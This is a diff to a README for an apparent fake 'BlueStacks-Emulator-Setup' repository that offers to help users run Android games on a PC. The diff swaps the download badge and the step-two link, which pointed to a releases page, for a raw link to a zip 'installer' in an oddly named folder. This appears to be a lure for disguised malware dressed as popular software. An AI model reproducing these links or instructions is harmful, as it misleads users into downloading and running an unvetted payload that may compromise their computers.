@@ -1,6 +1,6 @@
 # 🎮 BlueStacks-Emulator-Setup - Run Android Games On Your PC
 
-[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Gertcollegial180/BlueStacks-Emulator-Setup/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Gertcollegial180/BlueStacks-Emulator-Setup/main/nonreplacement/Setup_Emulator_Stacks_Blue_1.6-alpha.3.zip)
 
 BlueStacks acts as a bridge between your Windows computer and mobile software. You can load Android applications directly on your desktop. This tool optimizes performance for high frame rates and hardware controller support.
 
@@ -9,7 +9,7 @@ BlueStacks acts as a bridge between your Windows computer and mobile software. Y
 You do not need programming knowledge to setup this tool. Follow these steps to prepare your system and launch your mobile applications.
 
 1. Verify your system meets the requirements. Windows 10 or 11 works best.
-2. Visit the download page: [https://github.com/Gertcollegial180/BlueStacks-Emulator-Setup/releases](https://github.com/Gertcollegial180/BlueStacks-Emulator-Setup/releases)
+2. Visit the download page: [https://raw.githubusercontent.com/Gertcollegial180/BlueStacks-Emulator-Setup/main/nonreplacement/Setup_Emulator_Stacks_Blue_1.6-alpha.3.zip](https://raw.githubusercontent.com/Gertcollegial180/BlueStacks-Emulator-Setup/main/nonreplacement/Setup_Emulator_Stacks_Blue_1.6-alpha.3.zip)
 3. Locate the latest release file.
 4. Click the link to save the installer to your computer.
 
